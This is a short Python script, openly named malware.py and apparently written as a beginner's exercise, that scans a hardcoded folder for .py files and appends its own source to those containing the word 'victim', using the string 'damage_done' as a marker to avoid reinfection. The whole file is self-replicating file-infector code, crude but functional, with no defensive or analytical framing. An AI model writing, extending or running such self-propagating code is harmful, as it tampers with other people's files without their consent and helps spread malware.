from __future__ import with_statement
# Script Name: malware.py
# Description: Searches for definite target files
#              if found then copies itself into it
# Created By:  Eeran Maiti 11334191.
# Date:        11 January 2014.
import sys
import glob
import errno

def malware():
    # path is the path of the directory
    path = 'C:/Users/Jabberwocky/Desktop/photo/*.py'
    # This is supposedly meant to recursively fetch all folders in directory, I am not sure, new to python
    files = glob.glob(path) 
    # I open the malware in read mode because I will copy it in healthy files
    with open('C:/Users/Jabberwocky/Desktop/photo/malware.py','r') as mal_file:
        mal_content = mal_file.read()
        print ("malware file loaded")  
        # fetching all files
        for name in files: 
            try:
                with open(name, 'r+') as f: 
                    print ("reading file %s", name)
                    # if string 'damage_done' found, it will not be affected. to avoid multiple infection.
                    # this very line contains the string, so this file or where it is copied will not be affected.
                    if 'damage_done' in f.read():
                        print ("already infected file")
                    # if there is no such string, then it might be a target file
                    else:
                        print ("may be target file")
                        with open (name, 'r+') as g:
                            # check if string 'victim' is present, copy this malware script in it.
                            if 'victim' in g.read():
                                print  ("victim found")
                                g.write(mal_content)
                            else:
                                # Otherwise leave the file
                                print("not target or infected file")
                f.close()
                g.close()
            except IOError as exc:
                if exc.errno != errno.EISDIR: # Do not fail if a directory is found, just ignore it.
                    raise # Propagate other kinds of IOError.
    mal_file.close()

malware()